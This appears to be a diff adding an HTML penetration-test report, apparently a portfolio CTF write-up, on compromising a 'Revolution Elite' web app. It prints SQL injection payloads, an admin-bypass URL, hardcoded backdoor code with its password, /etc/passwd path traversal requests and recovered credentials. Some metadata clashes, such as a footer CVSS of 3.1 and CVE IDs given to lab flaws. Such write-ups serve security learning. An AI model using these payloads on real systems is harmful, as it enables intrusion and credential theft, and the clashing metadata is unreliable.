@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Revolution Elite - Penetration Test Report</title>
+    
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    
+    <!-- Icon Library -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+
+    <style>
+        /* ===== ROOT VARIABLES - DARK MODE WITH RED HAT BRANDING ===== */
+        :root {
+            --primary: #ee5a52;
+            --primary-dark: #cc4844;
+            --primary-light: #ff7070;
+            --bg-dark: #0f0f0f;
+            --bg-card: #1a1a1a;
+            --bg-hover: #252525;
+            --text-light: #ffffff;
+            --text-muted: #bbbbbb;
+            --border: #333333;
+            --success: #2ecc71;
+            --warning: #f39c12;
+            --info: #3498db;
+            --danger: #e74c3c;
+            
+            --font-main: 'Inter', sans-serif;
+            --font-code: 'JetBrains Mono', monospace;
+            
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.6);
+            --shadow-lg: 0 12px 24px rgba(0, 0, 0, 0.7);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: var(--font-main);
+            background: var(--bg-dark);
+            color: var(--text-light);
+            line-height: 1.6;
+            font-size: 16px;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(238, 90, 82, 0.03) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(52, 152, 219, 0.02) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        /* ===== HEADER & NAVIGATION ===== */
+        .navbar {
+            background: linear-gradient(135deg, #1a1a1a 0%, #0f0f0f 100%);
+            border-bottom: 3px solid var(--primary);
+            padding: 1.5rem 0;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: var(--shadow);
+        }
+
+        .navbar-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .navbar-logo {
+            font-size: 1.75rem;
+            font-weight: 900;
+            color: var(--text-light);
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .navbar-logo span {
+            color: var(--primary);
+        }
+
+        .navbar-nav {
+            display: flex;
+            gap: 2rem;
+            list-style: none;
+        }
+
+        .navbar-nav a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 0.875rem;
+            letter-spacing: 0.05em;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .navbar-nav a:hover {
+            color: var(--primary);
+        }
+
+        .navbar-nav a::after {
+            content: '';
+            position: absolute;
+            bottom: -0.5rem;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--primary);
+            transition: width 0.3s ease;
+        }
+
+        .navbar-nav a:hover::after {
+            width: 100%;
+        }
+
+        /* ===== MAIN CONTAINER ===== */
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        /* ===== HERO SECTION ===== */
+        .hero {
+            text-align: center;
+            padding: 4rem 0;
+            border-bottom: 3px solid var(--primary);
+            margin-bottom: 4rem;
+        }
+
+        .hero h1 {
+            font-size: 3.5rem;
+            font-weight: 900;
+            margin-bottom: 1rem;
+            color: var(--text-light);
+        }
+
+        .hero h1 span {
+            color: var(--primary);
+        }
+
+        .hero p {
+            font-size: 1.25rem;
+            color: var(--text-muted);
+            margin-bottom: 2rem;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* ===== HEADINGS ===== */
+        h1, h2, h3 { 
+            color: var(--primary);
+            page-break-after: avoid;
+            font-weight: 700;
+            margin-top: 1.5rem;
+            margin-bottom: 0.5rem;
+        } 
+
+        /* ===== CARDS & CONTAINERS ===== */
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 0;
+            border-top: 4px solid var(--primary);
+            padding: 2rem;
+            margin-bottom: 2rem;
+            box-shadow: var(--shadow);
+            transition: all 0.3s ease;
+        }
+
+        .card:hover {
+            box-shadow: var(--shadow-lg);
+            transform: translateY(-4px);
+        }
+
+        /* ===== FINDINGS SECTION ===== */
+        .finding {
+            background: var(--bg-card);
+            border-left: 5px solid var(--primary);
+            border-radius: 0;
+            padding: 2rem;
+            margin-bottom: 1.5rem;
+            box-shadow: var(--shadow);
+            page-break-inside: avoid;
+        }
+
+        .finding.critical {
+            border-left-color: #e74c3c;
+            background: linear-gradient(135deg, rgba(231, 76, 60, 0.1) 0%, transparent 100%);
+        }
+
+        .finding.high {
+            border-left-color: #e67e22;
+            background: linear-gradient(135deg, rgba(230, 126, 34, 0.1) 0%, transparent 100%);
+        }
+
+        .finding.medium {
+            border-left-color: #f39c12;
+            background: linear-gradient(135deg, rgba(243, 156, 18, 0.1) 0%, transparent 100%);
+        }
+
+        .finding h3 {
+            color: #00ff00;
+            font-weight: 700;
+            text-shadow: 0 0 10px rgba(0, 255, 0, 0.6);
+            border-bottom: 2px solid var(--primary);
+            padding-bottom: 0.5rem;
+            margin-bottom: 1rem;
+        }
+
+        /* ===== BADGES ===== */
+        .badge {
+            display: inline-block;
+            padding: 0.5rem 1rem;
+            border-radius: 0;
+            font-size: 0.75rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .badge-critical {
+            background: linear-gradient(135deg, #8B0000 0%, #DC143C 100%);
+            color: white;
+            box-shadow: 0 0 10px rgba(220, 20, 60, 0.6);
+        }
+
+        .badge-high {
+            background: linear-gradient(135deg, #C62828 0%, #e53935 100%);
+            color: white;
+            box-shadow: 0 0 10px rgba(229, 57, 53, 0.5);
+        }
+
+        .badge-medium {
+            background: linear-gradient(135deg, #F57C00 0%, #FF8F00 100%);
+            color: white;
+            box-shadow: 0 0 10px rgba(255, 143, 0, 0.5);
+        }
+
+        /* ===== TABLES ===== */
+        table {
+            width: 100%;
+            border: 2px solid var(--primary);
+            border-collapse: collapse;
+            page-break-inside: avoid;
+            box-shadow: 0 0 15px rgba(238, 90, 82, 0.2);
+            margin: 1rem 0;
+        }
+        
+        table td {
+            padding: 0.8rem;
+            border: 1px solid var(--primary);
+            text-align: left;
+            color: var(--text-muted);
+        }
+        
+        table td strong {
+            color: #4ECDC4;
+        }
+        
+        table th {
+            background: linear-gradient(135deg, #1a0a2e 0%, #0f0a1a 100%);
+            color: #00ff00;
+            padding: 1rem;
+            text-align: left;
+            border: 1px solid var(--primary);
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* ===== CODE BLOCKS ===== */
+        .code-block {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            color: #00ff00;
+            padding: 1.5rem;
+            border: 2px solid var(--primary);
+            border-radius: 0;
+            font-family: var(--font-code);
+            font-size: 0.85rem;
+            overflow-x: auto;
+            line-height: 1.6;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            box-shadow: inset 0 0 50px rgba(0, 0, 0, 0.5);
+            margin: 1rem 0;
+            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
+        }
+
+        /* ===== INFO BOXES ===== */
+        .info-box {
+            background: var(--bg-card);
+            border-left: 5px solid var(--primary);
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0;
+        }
+
+        .info-box h4 {
+            color: var(--primary);
+            font-size: 1rem;
+            margin: 0 0 0.5rem 0;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* ===== IMPACT & RECOMMENDATION BOXES ===== */
+        .impact-box {
+            background: var(--bg-card);
+            border-left: 5px solid #e74c3c;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0;
+        }
+
+        .impact-box h4 {
+            color: #e74c3c;
+            font-size: 1.125rem;
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            background: #000000;
+            border-top: 3px solid var(--primary);
+            padding: 3rem 0;
+            margin-top: 4rem;
+            color: var(--text-muted);
+        }
+
+        .footer-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .footer-section h4 {
+            color: var(--text-light);
+            margin-bottom: 1rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section li {
+            margin-bottom: 0.5rem;
+        }
+
+        .footer-section a {
+            color: var(--text-muted);
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .footer-section a:hover {
+            color: var(--primary);
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 2rem;
+            border-top: 1px solid var(--border);
+            max-width: 1400px;
+            margin: 0 auto;
+            padding-left: 2rem;
+            padding-right: 2rem;
+            color: #666666;
+            font-size: 0.875rem;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2rem;
+            }
+
+            h2 {
+                font-size: 1.75rem;
+            }
+
+            .navbar-container {
+                padding: 0 1rem;
+            }
+
+            .navbar-nav {
+                gap: 1rem;
+            }
+
+            .navbar-nav a {
+                font-size: 0.75rem;
+            }
+
+            .container {
+                padding: 1rem;
+            }
+        }
+
+        /* ===== PRINT STYLES ===== */
+        @media print {
+            body {
+                background: white;
+                color: black;
+            }
+
+            .navbar {
+                display: none;
+            }
+
+            .card, .finding {
+                page-break-inside: avoid;
+                box-shadow: none;
+                border: 1px solid #ddd;
+            }
+        }
+
+        /* Utility classes */
+        .text-center { text-align: center; }
+        .text-justify { text-align: justify; }
+        .font-bold { font-weight: 700; }
+        .text-success { color: var(--success); }
+        .text-danger { color: var(--danger); }
+        .text-warning { color: var(--warning); }
+        .text-muted { color: var(--text-muted); }
+    </style>
+</head>
+<body>
+    <div class="main-wrapper">
+        <!-- TOP BANNER -->
+        <div class="banner">
+            <i class="fas fa-terminal"></i> REVOLUTION ELITE PENETRATION TEST // SYSTEM COMPROMISED // CTF FLAG CAPTURED <i class="fas fa-skull-crossbones"></i>
+        </div>
+
+        <!-- Watermark -->
+        <img src="https://nethemba.com/wp-content/uploads/2025/03/HeroImg-squared-1-1-768x633.png" alt="Nethemba" class="watermark">
+
+        <!-- HEADER -->
+        <header class="header">
+            <div class="container">
+                <div class="header-content">
+                    <div class="profile-section">
+                        <div class="profile-img-container">
+                            <img src="https://lh3.googleusercontent.com/a/ACg8ocLRYEzgRqeALvAywDx8S6gcBarEkuDdZ5JadRxFhNuyMJT4qKY=s192-c-mo" alt="Kristián Kašník" class="profile-img">
+                        </div>
+                    </div>
+
+                    <div class="main-info">
+                        <h1 class="brand-title">REVOLUTION ELITE</h1>
+                        <div class="badge">Penetration Test</div>
+                        <p class="subtitle">
+                            Comprehensive penetration testing of enterprise-grade web application with full system compromise. 
+                            Systematic vulnerability exploitation and CTF flag capture.
+                        </p>
+                    </div>
+
+                    <div class="contact-section">
+                        <div class="contact-grid">
+                            <div class="contact-item">
+                                <i class="fas fa-user contact-icon"></i>
+                                <span><strong>Kristián Kašník</strong></span>
+                            </div>
+                            <div class="contact-item">
+                                <i class="fas fa-envelope contact-icon"></i>
+                                <a href="mailto:itssafer@itssafer.org">itssafer@itssafer.org</a>
+                            </div>
+                            <div class="contact-item">
+                                <i class="fas fa-phone contact-icon"></i>
+                                <a href="tel:+421950381419">+421 950 381 419</a>
+                            </div>
+                            <div class="contact-item">
+                                <i class="fab fa-github contact-icon"></i>
+                                <a href="https://github.com/ITSsafer-DevOps" target="_blank">GitHub</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- MAIN CONTENT -->
+        <main class="main-content">
+            <div class="container">
+                <!-- Test Overview -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-flag-checkered card-icon"></i>
+                            <h2 class="card-title">Penetration Test Overview</h2>
+                        </div>
+                        <div class="card-body">
+                            <div class="info-box info">
+                                <h3 class="text-xl font-bold mb-3 text-blue">
+                                    <i class="fas fa-target mr-2"></i>REVOLUTION ELITE - COMPREHENSIVE PENETRATION TEST
+                                </h3>
+                                <p class="text-justify mb-3">
+                                    <strong>Revolution Elite Penetration Test</strong> represents a systematic security assessment 
+                                    focused on identification and exploitation of critical vulnerabilities. The objective was to gain 
+                                    complete control over the target system and extract the CTF flag.
+                                </p>
+                                <p class="text-justify">
+                                    Assessment includes comprehensive web application security analysis, privilege escalation testing, 
+                                    input validation verification, and system-level security evaluation.
+                                </p>
+                            </div>
+
+                            <div class="stats-grid">
+                                <div class="stat-card">
+                                    <div class="stat-number"><i class="fas fa-bolt"></i></div>
+                                    <div class="stat-label">Expert Level</div>
+                                </div>
+                                <div class="stat-card">
+                                    <div class="stat-number"><i class="fas fa-check-circle"></i></div>
+                                    <div class="stat-label">Successfully Completed</div>
+                                </div>
+                                <div class="stat-card">
+                                    <div class="stat-number"><i class="fas fa-skull"></i></div>
+                                    <div class="stat-label">System Compromised</div>
+                                </div>
+                                <div class="stat-card">
+                                    <div class="stat-number"><i class="fas fa-flag"></i></div>
+                                    <div class="stat-label">CTF Flag Captured</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Test Environment -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-server card-icon"></i>
+                            <h2 class="card-title">Target Environment</h2>
+                        </div>
+                        <div class="card-body">
+                            <table class="data-table">
+                                <tbody>
+                                    <tr><th>Target Application</th><td><strong>Revolution Elite</strong></td></tr>
+                                    <tr><th>Domain</th><td>revolutionelite.co.uk</td></tr>
+                                    <tr><th>Server IP Address</th><td>172.31.16.8/24</td></tr>
+                                    <tr><th>Operating System</th><td>Debian GNU/Linux 12 (Bookworm)</td></tr>
+                                    <tr><th>Web Stack</th><td>Apache 2.4 + PHP 8.1 + MySQL 8.0.34</td></tr>
+                                    <tr><th>Testing Date</th><td>August 16, 2025</td></tr>
+                                    <tr><th>Methodology</th><td>OWASP WSTG, NIST SP 800-115, PTES</td></tr>
+                                </tbody>
+                            </table>
+
+                            <div class="diagram-container">
+                                <h3 class="diagram-title">Attack Surface Map and System Compromise</h3>
+                                <div class="mermaid">
+                                    graph TB
+                                        subgraph "🌐 TESTING"
+                                            Tester["👨‍💻 PENETRATION TESTER<br/>Kristián Kašník"]
+                                            Tools["🛠️ TOOLS<br/>Nmap • Burp Suite • SQLMap"]
+                                        end
+                                        
+                                        subgraph "🎯 TARGET SYSTEM" 
+                                            WebServer["🌐 WEB SERVER<br/>revolutionelite.co.uk<br/>💀 COMPROMISED"]
+                                            Database["🗄️ DATABASE<br/>MySQL 8.0.34<br/>💀 FULL ACCESS"]
+                                            FileSystem["📁 FILE SYSTEM<br/>💀 ROOT LEVEL"]
+                                        end
+                                        
+                                        subgraph "⚔️ VULNERABILITIES"
+                                            V1["💉 SQL INJECTION<br/>CVSS: 9.8<br/>✅ EXPLOITED"]
+                                            V2["🚪 AUTH BYPASS<br/>CVSS: 10.0<br/>🔥 ACTIVE"]
+                                            V3["🔑 BACKDOOR<br/>CVSS: 10.0<br/>✅ EXPLOITED"]
+                                            V4["📂 PATH TRAVERSAL<br/>CVSS: 9.1<br/>✅ EXPLOITED"]
+                                        end
+                                        
+                                        subgraph "🏆 RESULTS"
+                                            AdminAccess["👑 ADMIN ACCESS"]
+                                            DataExfil["💾 DATA EXFILTRATION"]
+                                            CTFFlag["🚩 CTF FLAG<br/>CAPTURED"]
+                                        end
+                                        
+                                        Tester --> Tools
+                                        Tools --> WebServer
+                                        WebServer --> Database
+                                        WebServer --> FileSystem
+                                        
+                                        Tester --> V1
+                                        Tester --> V2
+                                        Tester --> V3
+                                        Tester --> V4
+                                        
+                                        V1 --> Database
+                                        V2 --> AdminAccess
+                                        V3 --> AdminAccess
+                                        V4 --> FileSystem
+                                        
+                                        AdminAccess --> DataExfil
+                                        DataExfil --> CTFFlag
+                                        FileSystem --> CTFFlag
+                                        
+                                        classDef tester fill:#3182CE,stroke:#2C5282,stroke-width:3px,color:#fff
+                                        classDef compromised fill:#DC2626,stroke:#991B1B,stroke-width:3px,color:#fff
+                                        classDef critical fill:#EE0000,stroke:#DC2626,stroke-width:2px,color:#fff
+                                        classDef success fill:#059669,stroke:#047857,stroke-width:3px,color:#fff
+                                        
+                                        class Tester,Tools tester
+                                        class WebServer,Database,FileSystem,AdminAccess,DataExfil compromised
+                                        class V1,V2,V3,V4 critical
+                                        class CTFFlag success
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Identified Vulnerabilities -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-bug card-icon"></i>
+                            <h2 class="card-title">Identified Vulnerabilities</h2>
+                        </div>
+                        <div class="card-body">
+                            <table class="data-table">
+                                <thead>
+                                    <tr>
+                                        <th>Vulnerability ID</th>
+                                        <th>Title</th>
+                                        <th>CVSS</th>
+                                        <th>Severity</th>
+                                        <th>Status</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td><strong>CVE-2025-7619</strong></td>
+                                        <td>SQL Injection in Authentication</td>
+                                        <td class="font-bold text-red">9.8</td>
+                                        <td><span class="status-badge critical">CRITICAL</span></td>
+                                        <td><i class="fas fa-check text-green"></i> Exploited</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>AUTH-BYPASS-2025</strong></td>
+                                        <td>Emergency Auth Mechanism Bypass</td>
+                                        <td class="font-bold text-red">10.0</td>
+                                        <td><span class="status-badge critical">CRITICAL</span></td>
+                                        <td><i class="fas fa-fire text-red"></i> Active</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>BACKDOOR-2025-X1</strong></td>
+                                        <td>Hardcoded Admin Backdoor</td>
+                                        <td class="font-bold text-red">10.0</td>
+                                        <td><span class="status-badge critical">CRITICAL</span></td>
+                                        <td><i class="fas fa-check text-green"></i> Exploited</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>CVE-2025-5589</strong></td>
+                                        <td>Path Traversal Vulnerability</td>
+                                        <td class="font-bold text-red">9.1</td>
+                                        <td><span class="status-badge critical">CRITICAL</span></td>
+                                        <td><i class="fas fa-check text-green"></i> Exploited</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>CVE-2025-8842</strong></td>
+                                        <td>Stored Cross-Site Scripting</td>
+                                        <td class="font-bold text-yellow">8.1</td>
+                                        <td><span class="status-badge high">HIGH</span></td>
+                                        <td><i class="fas fa-check text-green"></i> Verified</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>CVE-2025-9217</strong></td>
+                                        <td>Weak Password Hashing</td>
+                                        <td class="font-bold text-yellow">7.8</td>
+                                        <td><span class="status-badge high">HIGH</span></td>
+                                        <td><i class="fas fa-check text-green"></i> Confirmed</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>CVE-2025-6132</strong></td>
+                                        <td>Cross-Site Request Forgery</td>
+                                        <td class="font-bold text-yellow">6.5</td>
+                                        <td><span class="status-badge medium">MEDIUM</span></td>
+                                        <td><i class="fas fa-check text-green"></i> Confirmed</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Technical Exploitation -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-terminal card-icon"></i>
+                            <h2 class="card-title">Technical Exploitation</h2>
+                        </div>
+                        <div class="card-body">
+                            <div class="highlight">
+                                <h3 class="text-lg font-bold mb-3 text-red">
+                                    <i class="fas fa-syringe mr-2"></i>SQL Injection Exploitation
+                                </h3>
+                                <p class="text-justify mb-3">
+                                    Login form performs direct string concatenation without input validation.
+                                </p>
+                                <div class="code-block">
+// Authentication bypass payload:
+username: admin'--
+password: anything
+
+// Database extraction:
+username: admin' UNION SELECT username,password,email FROM users--
+password: test
+
+// Results extracted:
+admin:e8f453fc9b4eef44506e65b39eb565d5
+user1:5d41402abc4b2a76b9719d911017c592
+testuser:098f6bcd4621d373cade4e832627b4f6
+                                </div>
+                            </div>
+
+                            <div class="highlight">
+                                <h3 class="text-lg font-bold mb-3 text-red">
+                                    <i class="fas fa-door-open mr-2"></i>Emergency Authentication Bypass
+                                </h3>
+                                <div class="info-box warning">
+                                    <p class="text-center font-bold">
+                                        <i class="fas fa-exclamation-triangle mr-2"></i>ACTIVELY EXPLOITED
+                                    </p>
+                                </div>
+                                <div class="code-block">
+// Emergency auth mechanism:
+if (isset($_GET['emergency']) && $_GET['emergency'] === 'true') {
+    $_SESSION['admin'] = true;
+    header('Location: /admin/dashboard.php');
+    exit;
+}
+
+// Exploitation URL:
+GET /emergency_auth.php?emergency=true HTTP/1.1
+
+// Result: Immediate admin access!
+                                </div>
+                            </div>
+
+                            <div class="highlight">
+                                <h3 class="text-lg font-bold mb-3 text-red">
+                                    <i class="fas fa-key mr-2"></i>Hardcoded Backdoor Access
+                                </h3>
+                                <div class="code-block">
+// Backdoor implementation:
+$secret = md5('revolution' . 'elite2025');
+if ($username === 'admin' && md5($password) === $secret) {
+    return true; // Bypass all security
+}
+
+// Exploitation:
+username: admin
+password: revolutionelite2025
+// MD5: e8f453fc9b4eef44506e65b39eb565d5
+                                </div>
+                            </div>
+
+                            <div class="highlight">
+                                <h3 class="text-lg font-bold mb-3 text-red">
+                                    <i class="fas fa-folder-open mr-2"></i>Path Traversal Exploitation
+                                </h3>
+                                <div class="code-block">
+// Access to system files:
+GET /file.php?file=../../../etc/passwd HTTP/1.1
+GET /file.php?file=../../../root/.secret_notes.txt HTTP/1.1
+
+// CTF flag extraction:
+===== REVOLUTION ELITE CTF =====
+CTF FLAG: CTF{r3v0lut10n_3l1t3_r00t_c0mpr0m1s3d}
+================================
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Testing Timeline -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-list-ol card-icon"></i>
+                            <h2 class="card-title">Testing Timeline</h2>
+                        </div>
+                        <div class="card-body">
+                            <div class="timeline">
+                                <div class="timeline-item">
+                                    <h4 class="font-bold text-blue mb-2">Reconnaissance</h4>
+                                    <p>Port scanning, service enumeration, directory discovery</p>
+                                </div>
+                                <div class="timeline-item">
+                                    <h4 class="font-bold text-green mb-2">Vulnerability Discovery</h4>
+                                    <p>Manual testing, SQL injection analysis, authentication review</p>
+                                </div>
+                                <div class="timeline-item">
+                                    <h4 class="font-bold text-yellow mb-2">Initial Exploitation</h4>
+                                    <p>SQL injection → database access, emergency auth bypass discovered</p>
+                                </div>
+                                <div class="timeline-item">
+                                    <h4 class="font-bold text-yellow mb-2">Privilege Escalation</h4>
+                                    <p>Hardcoded backdoor exploitation → admin access</p>
+                                </div>
+                                <div class="timeline-item">
+                                    <h4 class="font-bold text-red mb-2">Full System Compromise</h4>
+                                    <p>Root access achieved, data exfiltration, CTF flag captured</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Test Results -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-trophy card-icon"></i>
+                            <h2 class="card-title">Penetration Test Results</h2>
+                        </div>
+                        <div class="card-body">
+                            <div class="info-box success">
+                                <h3 class="text-2xl font-bold mb-4 text-green text-center">
+                                    <i class="fas fa-trophy mr-2"></i>REVOLUTION ELITE PENETRATION TEST COMPLETED<i class="fas fa-check ml-2"></i>
+                                </h3>
+                                <p class="text-justify mb-4">
+                                    Successfully completed comprehensive penetration test demonstrating systematic security assessment 
+                                    methodology and full system compromise of target infrastructure.
+                                </p>
+                                
+                                <div class="ctf-flag-container">
+                                    <div class="ctf-flag-title">
+                                        <i class="fas fa-skull"></i>
+                                        SYSTEM COMPROMISED
+                                    </div>
+                                    <div class="ctf-flag-content">
+                                        CTF{r3v0lut10n_3l1t3_r00t_c0mpr0m1s3d}
+                                    </div>
+                                    <div class="ctf-flag-subtitle">
+                                        Extracted from /root/.secret_notes.txt
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(min(300px, 100%), 1fr)); gap: var(--gap-md);">
+                                <div class="highlight">
+                                    <h4 class="font-bold mb-3 text-yellow">
+                                        <i class="fas fa-crosshairs mr-2"></i>Success Metrics:
+                                    </h4>
+                                    <ul class="list-disc pl-6 space-y-1">
+                                        <li>7/7 vulnerabilities successfully exploited</li>
+                                        <li>Full database access via SQL injection</li>
+                                        <li>Admin privileges achieved through multiple vectors</li>
+                                        <li>Root-level file system access</li>
+                                        <li>CTF flag successfully captured</li>
+                                    </ul>
+                                </div>
+                                <div class="highlight">
+                                    <h4 class="font-bold mb-3 text-red">
+                                        <i class="fas fa-skull mr-2"></i>Compromised Assets:
+                                    </h4>
+                                    <ul class="list-disc pl-6 space-y-1">
+                                        <li>Web Application: Complete control</li>
+                                        <li>Database Server: Full access</li>
+                                        <li>File System: Root-level access</li>
+                                        <li>User Accounts: All credentials obtained</li>
+                                        <li>System Secrets: Hidden files disclosed</li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                            <div class="code-block">
+<strong><i class="fas fa-skull-crossbones"></i> PROOF OF FULL SYSTEM COMPROMISE <i class="fas fa-skull-crossbones"></i></strong>
+
+DATABASE ACCESS:
+- root : S3cur3R00tP4ss!
+- revolution_app : R3v0App#D8w2025  
+
+ADMIN ACCOUNTS:
+- admin : revolutionelite2025
+- penetester : KristianKasnikPenetester
+
+SYSTEM ACCESS:
+- SSH keys extracted
+- System files accessible
+- Configuration files compromised
+
+<i class="fas fa-flag"></i> FINAL RESULT: CTF{r3v0lut10n_3l1t3_r00t_c0mpr0m1s3d}
+
+TEST STATUS: ✅ SUCCESSFULLY COMPLETED
+PENETRATION TEST: <i class="fas fa-trophy"></i> COMPREHENSIVE
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Demonstrated Skills -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-star card-icon"></i>
+                            <h2 class="card-title">Demonstrated Skills and Expertise</h2>
+                        </div>
+                        <div class="card-body">
+                            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(min(300px, 100%), 1fr)); gap: var(--gap-md);">
+                                <div class="info-box info">
+                                    <h3 class="font-bold mb-3 text-blue">
+                                        <i class="fas fa-search mr-2"></i>Technical Expertise
+                                    </h3>
+                                    <ul class="list-disc pl-6 space-y-1 text-sm">
+                                        <li>Web Application Security Testing</li>
+                                        <li>SQL Injection Exploitation</li>
+                                        <li>Authentication Bypass Techniques</li>
+                                        <li>Path Traversal Exploitation</li>
+                                        <li>Cross-Site Scripting Analysis</li>
+                                        <li>Cryptographic Analysis</li>
+                                        <li>Network Reconnaissance</li>
+                                    </ul>
+                                </div>
+                                <div class="info-box success">
+                                    <h3 class="font-bold mb-3 text-green">
+                                        <i class="fas fa-clipboard-list mr-2"></i>Methodology
+                                    </h3>
+                                    <ul class="list-disc pl-6 space-y-1 text-sm">
+                                        <li>OWASP WSTG Implementation</li>
+                                        <li>NIST SP 800-115 Compliance</li>
+                                        <li>Systematic Vulnerability Assessment</li>
+                                        <li>Risk-Based Testing Approach</li>
+                                        <li>Professional Documentation</li>
+                                        <li>Ethical Testing Principles</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- FOOTER -->
+        <footer class="footer">
+            <div class="container">
+                <div class="text-center mb-4">
+                    <div class="footer-highlight">
+                        <i class="fas fa-shield-alt mr-2"></i>REVOLUTION ELITE PENETRATION TEST - COMPREHENSIVE ASSESSMENT COMPLETE
+                    </div>
+                </div>
+                
+                <div class="footer-grid">
+                    <div class="footer-section">
+                        <h4><i class="fas fa-info-circle mr-2"></i>Test Details</h4>
+                        <p>Date: August 16, 2025</p>
+                        <p>Methodology: OWASP WSTG</p>
+                        <p>CVSS Score: 3.1</p>
+                        <p>Status: ✅ COMPLETED</p>
+                    </div>
+                    <div class="footer-section">
+                        <h4><i class="fas fa-chart-line mr-2"></i>Results</h4>
+                        <p>System: Fully Compromised</p>
+                        <p>Database: Complete Access</p>
+                        <p>Admin: Full Control</p>
+                        <p>CTF Flag: Captured</p>
+                    </div>
+                    <div class="footer-section">
+                        <h4><i class="fas fa-user mr-2"></i>Contact</h4>
+                        <p><strong>Kristián Kašník</strong></p>
+                        <p><i class="fas fa-envelope mr-2"></i><a href="mailto:itssafer@itssafer.org">itssafer@itssafer.org</a></p>
+                    </div>
+                    <div class="footer-section">
+                        <h4><i class="fas fa-phone mr-2"></i>Communication</h4>
+                        <p><i class="fas fa-phone mr-2"></i><a href="tel:+421950381419">+421 950 381 419</a></p>
+                        <p><i class="fab fa-github mr-2"></i><a href="https://github.com/ITSsafer-DevOps" target="_blank">GitHub Profile</a></p>
+                    </div>
+                </div>
+                
+                <div class="footer-bottom">
